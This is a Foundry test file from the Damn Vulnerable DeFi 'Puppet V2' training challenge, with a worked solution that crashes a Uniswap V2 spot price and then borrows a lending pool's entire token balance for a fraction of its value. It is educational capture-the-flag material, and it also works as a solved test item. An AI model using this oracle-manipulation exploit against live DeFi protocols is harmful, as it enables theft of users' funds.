// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";
import {UniswapV2Library} from "../../src/puppet-v2/UniswapV2Library.sol";

contract PuppetV2Challenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapV2Exchange;
    PuppetV2Pool lendingPool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy tokens to be traded
        token = new DamnValuableToken();
        weth = new WETH();

        // Deploy Uniswap V2 Factory and Router
        uniswapV2Factory = IUniswapV2Factory(
            deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV2Factory.json"), abi.encode(address(0)))
        );
        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV2Router02.json"),
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Create Uniswap pair against WETH and add liquidity
        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}({
            token: address(token),
            amountTokenDesired: UNISWAP_INITIAL_TOKEN_RESERVE,
            amountTokenMin: 0,
            amountETHMin: 0,
            to: deployer,
            deadline: block.timestamp * 2
        });
        uniswapV2Exchange = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));

        // Deploy the lending pool
        lendingPool =
            new PuppetV2Pool(address(weth), address(token), address(uniswapV2Exchange), address(uniswapV2Factory));

        // Setup initial token balances of pool and player accounts
        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE, "player ETH balance is not 20e18");
        assertEq(token.balanceOf(player), PLAYER_INITIAL_TOKEN_BALANCE, "player token balance is not 10000e18");
        assertEq(token.balanceOf(address(lendingPool)), POOL_INITIAL_TOKEN_BALANCE);
        assertGt(uniswapV2Exchange.balanceOf(deployer), 0);

        // Check pool's been correctly setup
        assertEq(lendingPool.calculateDepositOfWETHRequired(1 ether), 0.3 ether);
        assertEq(lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE), 300_000 ether);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_puppetV2() public checkSolvedByPlayer {
        uint256 DepositOfWETHRequired =
            lendingPool.calculateDepositOfWETHRequired(token.balanceOf(address(lendingPool)));
        emit log_named_decimal_uint("DepositOfWETHRequired before price manupulation", DepositOfWETHRequired, 18);
        emit log_named_decimal_uint(
            "lendingPool DVT balance before price manupulation", token.balanceOf(address(lendingPool)), 18
        );
        emit log_named_decimal_uint(
            "uniswapV2Exchange WETH balance before price manupulation", weth.balanceOf(address(uniswapV2Exchange)), 18
        );
        emit log_named_decimal_uint(
            "uniswapV2Exchange DVT balance before price manupulation", token.balanceOf(address(uniswapV2Exchange)), 18
        );
        emit log_named_decimal_uint("Player ETH balance before price manupulation", player.balance, 18);
        emit log_named_decimal_uint("Player WETH balance before price manupulation", weth.balanceOf(player), 18);
        emit log_named_decimal_uint("Player DVT balance before price manupulation", token.balanceOf(player), 18);

        // Define the swap path: DVT -> WETH
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);

        // Player swaps all of his DVT with ETH, decresing the price of DVT in the exchange
        // depositOfWETHRequired before this swap was 300_000e18 for 1_000_000e18 DVTs
        // depositOfWETHRequired after this swap is 29.49 for the same 1_000_000e18 DVTs
        // player ETH balance was 20 before this swap
        // player ETH balance is 29.90 after this swap
        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
        uniswapV2Router.swapExactTokensForETH(PLAYER_INITIAL_TOKEN_BALANCE, 1, path, player, block.timestamp);

        console.log();
        console.log("Swap executed successfully");
        emit log_named_decimal_uint(
            "uniswapV2Exchange WETH balance after price manipulation", weth.balanceOf(address(uniswapV2Exchange)), 18
        );
        emit log_named_decimal_uint(
            "uniswapV2Exchange DVT balance after price manipulation", token.balanceOf(address(uniswapV2Exchange)), 18
        );
        emit log_named_decimal_uint("Player ETH balance after price manipulation", player.balance, 18);
        emit log_named_decimal_uint("Player WETH balance after price manipulation", weth.balanceOf(player), 18);
        emit log_named_decimal_uint("Player DVT balance after price manipulation", token.balanceOf(player), 18);
        uint256 DepositOfWETHRequiredafterswap =
            lendingPool.calculateDepositOfWETHRequired(token.balanceOf(address(lendingPool)));
        emit log_named_decimal_uint("DepositOfWETHRequiredafterswap", DepositOfWETHRequiredafterswap, 18);

        // player swaps his ETH with WETH
        weth.deposit{value: player.balance}();

        // player approves WETH for lending pool and borrows the full DVT amount from the pool
        weth.approve(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);
        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);

        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);

        console.log();
        emit log_named_decimal_uint("lendingPool DVT balance after borrow", token.balanceOf(address(lendingPool)), 18);
        emit log_named_decimal_uint("recovery DVT balance after borrow", token.balanceOf(recovery), 18);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(lendingPool)), 0, "Lending pool still has tokens");
        assertEq(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
